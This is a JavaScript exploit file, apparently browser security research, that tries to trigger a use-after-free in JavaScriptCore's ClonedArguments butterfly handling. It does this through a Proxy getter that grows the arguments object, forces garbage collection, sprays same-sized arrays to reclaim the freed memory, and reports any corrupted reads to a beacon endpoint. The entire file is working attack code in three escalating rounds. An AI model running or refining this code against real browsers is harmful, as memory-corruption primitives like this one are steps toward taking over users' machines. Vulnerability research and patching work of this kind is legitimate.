// p220c — ClonedArguments butterfly UAF with forced GC
//
// Key insight from source (ButterflyInlines.h:220-224):
// reallocArrayRightIfPossible allocates NEW butterfly, copies data,
// returns new ptr. Old butterfly is NOT freed — it's left for GC.
// canRealloc is false for small butterflies (< PreciseAllocation threshold).
//
// So the old butterfly is "dead" (not referenced by the object) but NOT freed.
// We need GC to run and collect it, THEN spray to reclaim the page.
//
// Strategy:
// 1. In the Proxy trap, grow the arguments (old butterfly becomes garbage)
// 2. Force GC by allocating tons of objects (pressure-based collection)
// 3. After GC collects the old butterfly, spray to reclaim its memory
// 4. The stale pointer in copyToArguments reads from our spray data
//
// Beacon prefix: V220C-

(function() {
  function B(tag, body) {
    var url = '/beacon/V220C-' + tag + '?t=' + Date.now();
    try {
      var x = new XMLHttpRequest();
      if (body) {
        x.open('POST', url, true);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send(String(body));
      } else {
        x.open('GET', url, true);
        x.send();
      }
    } catch (e) {}
  }

  function hex(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  B('BOOT');

  function target() { return arguments; }
  function receiver() { return Array.prototype.slice.call(arguments); }

  // Force GC by creating massive allocation pressure
  // JSC triggers collection when the eden space fills up
  function forceGC() {
    var pressure = [];
    // Allocate ~30MB of short-lived objects to trigger Eden collection
    for (var i = 0; i < 50000; i++) {
      pressure.push({a: i, b: i + 1, c: new Array(8)});
    }
    // Let them die
    pressure = null;
    // Second wave to trigger full collection
    var pressure2 = [];
    for (var i = 0; i < 50000; i++) {
      pressure2.push(new Array(16).fill(i));
    }
    pressure2 = null;
    // Third wave — by now GC should have run at least once
    var pressure3 = [];
    for (var i = 0; i < 30000; i++) {
      pressure3.push(new ArrayBuffer(64));
    }
    pressure3 = null;
  }

  // --- Round 1: 16 args, hole at 14 (near top), force GC then spray ---
  function round1() {
    B('R1-START');
    var NARGS = 16;
    var HOLE_IDX = 14;

    var reallocCount = 0;
    var sprayArrays = [];

    var args = target(
      0xAA00, 0xAA01, 0xAA02, 0xAA03,
      0xAA04, 0xAA05, 0xAA06, 0xAA07,
      0xAA08, 0xAA09, 0xAA0A, 0xAA0B,
      0xAA0C, 0xAA0D, 0xAA0E, 0xAA0F
    );
    delete args[HOLE_IDX];

    var trapHandler = {
      get: function(t, prop, r) {
        reallocCount++;
        if (reallocCount !== 1) return 0xDEAD0000 | reallocCount;
        B('R1-TRAP-' + prop);

        // Step 1: Grow arguments → old butterfly becomes garbage
        for (var j = NARGS; j < 2000; j++) args[j] = 0xCC;
        B('R1-GREW');

        // Step 2: Force GC to collect the old butterfly
        forceGC();
        B('R1-GC-DONE');

        // Step 3: Spray to reclaim the freed page
        // Old butterfly: 16 * 8 + 8(IndexingHeader) = 136 bytes
        // After GC, the page containing it may be returned to the OS
        // or reused by the allocator. Spray with matching-size objects.
        for (var s = 0; s < 10000; s++) {
          // Use plain arrays — they allocate butterflies from the same GC space
          var arr = new Array(NARGS);
          for (var k = 0; k < NARGS; k++) {
            arr[k] = 0xCAFE0000 | (s & 0xFFFF);
          }
          sprayArrays.push(arr);
        }
        B('R1-SPRAY-' + sprayArrays.length);

        return 0xBEEF0001;
      }
    };

    Object.setPrototypeOf(args, new Proxy({}, trapHandler));

    var result;
    try {
      result = receiver.apply(null, args);
    } catch (e) {
      B('R1-APPLY-ERR-' + e.message.substring(0, 40));
      return;
    }

    if (!result) { B('R1-NULL'); return; }
    B('R1-LEN-' + result.length);

    // Check ALL indices 0-13 (read from stale pointer after trap at 14)
    var corruptCount = 0;
    var vals = [];
    for (var i = 0; i < NARGS; i++) {
      var v = result[i];
      var u = (typeof v === 'number') ? (v >>> 0) : 0;
      var expected = 0xAA00 + i;
      var tag;

      if (i === HOLE_IDX) {
        tag = 'H:' + hex(u);
      } else if (typeof v === 'number') {
        if (u !== expected) {
          corruptCount++;
          if ((u >>> 16) === 0xCAFE) {
            tag = 'SPRAY:' + hex(u);
          } else {
            tag = '!' + hex(u);
          }
        } else {
          tag = hex(u);
        }
      } else if (typeof v === 'object') {
        corruptCount++;
        tag = 'OBJ';
      } else if (typeof v === 'string') {
        corruptCount++;
        tag = 'STR:' + v.substring(0, 8);
      } else if (v === undefined) {
        tag = 'undef';
        if (i !== HOLE_IDX) corruptCount++;
      } else {
        corruptCount++;
        tag = typeof v;
      }
      vals.push(i + '=' + tag);
    }
    B('R1-VALS', vals.join(' '));
    B('R1-CORRUPT-' + corruptCount);
    if (corruptCount > 0) B('R1-UAF-CONFIRMED');
  }

  // --- Round 2: Larger butterfly (64 args), multiple holes ---
  function round2() {
    B('R2-START');
    var NARGS = 64;
    var HOLES = [62, 60, 58, 56]; // Multiple holes near top

    var reallocCount = 0;
    var sprayArrays = [];

    var argVals = [];
    for (var i = 0; i < NARGS; i++) argVals.push(0xBB00 + i);
    var args = target.apply(null, argVals);
    for (var h = 0; h < HOLES.length; h++) delete args[HOLES[h]];

    var trapHandler = {
      get: function(t, prop, r) {
        reallocCount++;
        if (reallocCount !== 1) return 0xDEAD0000 | reallocCount;
        B('R2-TRAP-' + prop);

        // Grow
        for (var j = NARGS; j < 8000; j++) args[j] = 0xDD;
        B('R2-GREW');

        // GC
        forceGC();
        B('R2-GC');

        // Spray with 64-element arrays (matching old butterfly size: 64*8+8=520 bytes)
        for (var s = 0; s < 8000; s++) {
          var arr = new Array(NARGS);
          for (var k = 0; k < NARGS; k++) arr[k] = 0xD0AD0000 | (s & 0xFFFF);
          sprayArrays.push(arr);
        }
        B('R2-SPRAY-' + sprayArrays.length);

        return 0xBEEF0002;
      }
    };

    Object.setPrototypeOf(args, new Proxy({}, trapHandler));

    var result;
    try {
      result = receiver.apply(null, args);
    } catch (e) {
      B('R2-APPLY-ERR-' + e.message.substring(0, 40));
      return;
    }

    if (!result) { B('R2-NULL'); return; }
    B('R2-LEN-' + result.length);

    var corruptCount = 0;
    var interesting = [];
    var isHole = {};
    for (var h = 0; h < HOLES.length; h++) isHole[HOLES[h]] = true;

    for (var i = 0; i < NARGS; i++) {
      var v = result[i];
      var u = (typeof v === 'number') ? (v >>> 0) : 0;
      var expected = 0xBB00 + i;

      if (isHole[i]) continue; // skip hole indices
      if (typeof v === 'number' && u !== expected) {
        corruptCount++;
        interesting.push(i + '=!' + hex(u));
      } else if (typeof v !== 'number') {
        corruptCount++;
        interesting.push(i + '=' + typeof v);
      }
    }
    B('R2-CORRUPT-' + corruptCount);
    if (interesting.length > 0) {
      B('R2-INTERESTING', interesting.slice(0, 30).join(' '));
      B('R2-UAF-CONFIRMED');
    }
  }

  // --- Round 3: Multiple sequential triggers to increase chance ---
  function round3() {
    B('R3-START');
    var NARGS = 16;
    var HOLE_IDX = 14;
    var anyCorrupt = false;

    for (var attempt = 0; attempt < 5; attempt++) {
      var reallocCount = 0;
      var sprayArrays = [];

      var args = target(
        0xEE00, 0xEE01, 0xEE02, 0xEE03,
        0xEE04, 0xEE05, 0xEE06, 0xEE07,
        0xEE08, 0xEE09, 0xEE0A, 0xEE0B,
        0xEE0C, 0xEE0D, 0xEE0E, 0xEE0F
      );
      delete args[HOLE_IDX];

      (function(attemptN, argsRef) {
        var rc = 0;
        var spray = [];

        var trapH = {
          get: function(t, prop, r) {
            rc++;
            if (rc !== 1) return 0xDEAD0000 | rc;

            // Grow
            for (var j = 16; j < 3000; j++) argsRef[j] = 0xFF;

            // Aggressive GC: multiple rounds of pressure
            for (var g = 0; g < 3; g++) {
              var p = [];
              for (var i = 0; i < 40000; i++) p.push(new Array(8).fill(i));
              p = null;
            }

            // Spray
            for (var s = 0; s < 12000; s++) {
              var arr = new Array(16);
              for (var k = 0; k < 16; k++) arr[k] = 0xF00D0000 | (attemptN << 12) | (s & 0xFFF);
              spray.push(arr);
            }

            return 0xBEEF0000 | attemptN;
          }
        };

        Object.setPrototypeOf(argsRef, new Proxy({}, trapH));

        try {
          var result = receiver.apply(null, argsRef);
          if (result) {
            var corrupt = 0;
            var vals = [];
            for (var i = 0; i < 16; i++) {
              if (i === HOLE_IDX) continue;
              var v = result[i];
              var u = (typeof v === 'number') ? (v >>> 0) : 0;
              if (typeof v === 'number' && u !== (0xEE00 + i)) {
                corrupt++;
                vals.push(i + '=' + hex(u));
              } else if (typeof v !== 'number') {
                corrupt++;
                vals.push(i + '=' + typeof v);
              }
            }
            if (corrupt > 0) {
              B('R3-ATT' + attemptN + '-CORRUPT-' + corrupt, vals.join(' '));
              anyCorrupt = true;
            }
          }
        } catch (e) {
          B('R3-ATT' + attemptN + '-ERR-' + e.message.substring(0, 30));
        }
      })(attempt, args);
    }

    if (anyCorrupt) {
      B('R3-UAF-CONFIRMED');
    } else {
      B('R3-NO-CORRUPT');
    }
  }

  try { round1(); } catch(e) { B('R1-FATAL-' + e.message.substring(0, 40)); }
  try { round2(); } catch(e) { B('R2-FATAL-' + e.message.substring(0, 40)); }
  try { round3(); } catch(e) { B('R3-FATAL-' + e.message.substring(0, 40)); }

  B('ALL-DONE');
})();
